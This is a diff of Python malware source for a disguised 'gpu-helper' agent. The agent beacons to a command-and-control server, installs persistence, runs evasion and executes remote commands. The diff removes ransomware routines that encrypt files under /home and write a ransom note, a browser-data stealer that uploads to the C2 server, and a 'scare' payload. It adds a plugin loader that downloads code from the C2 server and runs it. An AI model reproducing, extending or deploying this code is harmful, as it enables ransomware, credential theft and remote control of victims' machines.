@@ -19,44 +19,26 @@ from lib.persistence import (
     install_persistence,
     remove_persistence,
 )
-from lib.crypto_utils import (
-    find_target_files,
-    encrypt_file,
-    decrypt_file,
-    count_encrypted_files,
-    ROGUEBYTE_HEADER,
-    write_ransom_note,
-    write_decrypt_sentinel,
-)
 from lib.c2_client import get_system_info, send_beacon, upload_file
 from lib.evasion import run_evasion
-from lib.browser_stealer import steal_all as steal_browser_data
+from lib import plugin_loader
 
-from settings import C2_SERVER, TRAFFIC_KEY, PUBLIC_KEY_PEM, BUILD_NUMBER
+from settings import C2_SERVER, TRAFFIC_KEY, BUILD_NUMBER
 
 SERVICE_NAME = "gpu-helper"
 EXE_PATH = os.path.abspath(sys.argv[0])
-
-TARGET_DIRS = ['/home']
-
 BEACON_INTERVAL = 60
 
 
 def exec_command(
     cmd: str, params: dict, files: list, agent_state: dict
 ) -> str:
-    if cmd == 'encrypt':
-        files[:] = find_target_files(TARGET_DIRS)
-        return _encrypt_all(files)
-    elif cmd == 'decrypt':
-        private_key = params.get('private_key')
-        if not private_key:
-            return 'no private key provided'
-        files[:] = find_target_files(TARGET_DIRS)
-        return _decrypt_all(files, private_key)
-    elif cmd == 'status':
-        encrypted = count_encrypted_files(files)
-        return f'{encrypted}/{len(files)} files encrypted'
+    if cmd == 'status':
+        return (
+            f'agent: gpu_helper, '
+            f'persistent: {agent_state.get("persistent")}, '
+            f'tracked: {len(files)} files'
+        )
     elif cmd == 'persist':
         if is_persistent(SERVICE_NAME):
             return 'already persistent'
@@ -126,35 +108,41 @@ def exec_command(
     elif cmd == 'pskill':
         pid = params.get('pid', '')
         return _kill_process(pid)
-    elif cmd == 'steal_browsers':
-        return _steal_browsers(agent_state.get('hostname', 'unknown'))
-    elif cmd == 'scare':
-        return _run_scare(agent_state.get('hostname', 'unknown'))
+    elif cmd == 'load_plugin':
+        name = params.get('plugin_name', '')
+        if not name:
+            return 'load_plugin: no plugin_name'
+        path = plugin_loader.download_plugin(C2_SERVER, name)
+        if not path:
+            return f'load_plugin: failed to download {name}'
+        info = plugin_loader.load_plugin_from_path(path)
+        if not info:
+            return f'load_plugin: failed to load {name}'
+        return (
+            f'loaded {info["name"]} v{info["version"]} '
+            f'— {len(info["commands"])} commands registered'
+        )
+    elif cmd == 'unload_plugin':
+        name = params.get('plugin_name', '')
+        if not name:
+            return 'unload_plugin: no plugin_name'
+        if plugin_loader.unload_plugin(name):
+            return f'unloaded {name}'
+        return f'unload_plugin: {name} not loaded'
+    elif cmd == 'list_plugins':
+        info = plugin_loader.list_plugins()
+        if not info:
+            return 'no plugins loaded'
+        lines = []
+        for pname, pdata in info.items():
+            cmds = ', '.join(pdata.get('commands', []))
+            lines.append(f'{pname} v{pdata.get("version", "?")} [{cmds}]')
+        return '\n'.join(lines)
+
+    result = plugin_loader.dispatch(cmd, params, {'files': files, 'state': agent_state})
+    if result is not None:
+        return result
     return f'unknown command: {cmd}'
-
-
-def _encrypt_all(files: list) -> str:
-    success = 0
-    failed = 0
-    for f in files:
-        if encrypt_file(f, PUBLIC_KEY_PEM):
-            success += 1
-        else:
-            failed += 1
-    write_ransom_note()
-    write_decrypt_sentinel()
-    return f'encryption completed: {success} ok, {failed} failed'
-
-
-def _decrypt_all(files: list, private_key_pem: str) -> str:
-    success = 0
-    failed = 0
-    for f in files:
-        if decrypt_file(f, private_key_pem):
-            success += 1
-        else:
-            failed += 1
-    return f'decryption completed: {success} ok, {failed} failed'
 
 
 def _collect_network_info() -> str:
@@ -174,7 +162,7 @@ def _collect_network_info() -> str:
 def _show_ransom_note() -> str:
     note_path = os.path.join(os.getcwd(), "README.txt")
     if not os.path.exists(note_path):
-        write_ransom_note()
+        return 'ransom note not found'
     try:
         subprocess.Popen(['xdg-open', note_path],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -228,72 +216,6 @@ def _kill_process(pid: str) -> str:
         return f'kill error: {e}'
 
 
-def _steal_browsers(hostname: str) -> str:
-    try:
-        zip_path = steal_browser_data()
-        if not zip_path:
-            return 'steal: no browser data found'
-        result = upload_file(C2_SERVER, hostname, zip_path)
-        os.unlink(zip_path)
-        return f'browser data: {result}'
-    except Exception as e:
-        return f'steal error: {e}'
-
-
-def _run_scare(hostname: str) -> str:
-    list_url = f"{C2_SERVER}/api/scare/gifs?list=1"
-    try:
-        resp = urllib.request.urlopen(list_url, timeout=10)
-        gif_list = json.loads(resp.read())
-    except Exception as e:
-        return f'scare: failed to fetch gif list ({e})'
-    if not gif_list:
-        return 'scare: no gifs available'
-
-    home = os.path.expanduser('~')
-    locations = [
-        os.path.join(home, 'Desktop'),
-        os.path.join(home, 'Downloads'),
-        os.path.join(home, 'Documents'),
-        os.path.join(home, 'DedSec'),
-        os.path.join(tempfile.gettempdir(), '.dedsec'),
-    ]
-    for loc in locations:
-        try:
-            os.makedirs(loc, exist_ok=True)
-        except Exception:
-            pass
-
-    downloaded = []
-    for i, gif_name in enumerate(gif_list):
-        try:
-            gif_url = f"{C2_SERVER}/api/scare/gifs?file={urllib.parse.quote(gif_name)}"
-            resp = urllib.request.urlopen(gif_url, timeout=30)
-            data = resp.read()
-            loc = locations[i % len(locations)]
-            dest = os.path.join(loc, gif_name)
-            with open(dest, 'wb') as f:
-                f.write(data)
-            downloaded.append(dest)
-        except Exception:
-            continue
-
-    if not downloaded:
-        return 'scare: failed to download any gifs'
-
-    opened = 0
-    to_open = downloaded[:5]
-    for gif_path in to_open:
-        try:
-            webbrowser.open(f'file://{gif_path}', new=1)
-            opened += 1
-            time.sleep(0.3)
-        except Exception:
-            continue
-
-    return f'scare: {len(downloaded)} gifs placed, {opened} opened'
-
-
 def beacon_loop():
     info = get_system_info(lambda: is_persistent(SERVICE_NAME))
     info['agent'] = 'gpu_helper'
@@ -301,11 +223,8 @@ def beacon_loop():
     info['architecture'] = platform.machine()
     info['version'] = '1.0'
     info['build_number'] = BUILD_NUMBER
-    status = "waiting"
-    files_encrypted = 0
     last_result = None
-
-    target_files = find_target_files(TARGET_DIRS)
+    tracked_files: list[str] = []
 
     while True:
         info['persistent'] = is_persistent(SERVICE_NAME)
@@ -319,47 +238,15 @@ def beacon_loop():
             cmd_data = result['command']
             cmd_name = cmd_data.get('command')
             cmd_params = cmd_data.get('params', {})
-
-            if cmd_name == 'encrypt':
-                t = threading.Thread(
-                    target=_handle_command_async,
-                    args=(cmd_name, cmd_params, target_files, info),
-                    daemon=True
-                )
-                t.start()
-            else:
-                cmd_result = exec_command(
-                    cmd_name, cmd_params, target_files, info
-                )
-                last_result = cmd_result
-                if cmd_name == 'encrypt':
-                    status = 'encrypted'
-                    files_encrypted = count_encrypted_files(target_files)
-                elif cmd_name == 'decrypt':
-                    status = 'decrypted'
-                    files_encrypted = 0
-
-        info['status'] = status
-        info['files_found'] = len(target_files)
-        info['files_encrypted'] = files_encrypted
+            cmd_result = exec_command(
+                cmd_name, cmd_params, tracked_files, info
+            )
+            last_result = cmd_result
 
         jitter = random.randint(0, 30)
         time.sleep(BEACON_INTERVAL + jitter)
 
 
-def _handle_command_async(
-    cmd_name: str, cmd_params: dict, target_files: list, info: dict
-):
-    target_files[:] = find_target_files(TARGET_DIRS)
-    result_text = _encrypt_all(target_files)
-    info['result'] = result_text
-    send_beacon(C2_SERVER, info, TRAFFIC_KEY)
-    info['status'] = 'encrypted'
-    info['files_found'] = len(target_files)
-    info['files_encrypted'] = count_encrypted_files(target_files)
-
-
 if __name__ == '__main__':
     run_evasion(EXE_PATH)
-    target_files = find_target_files(TARGET_DIRS)
     beacon_loop()
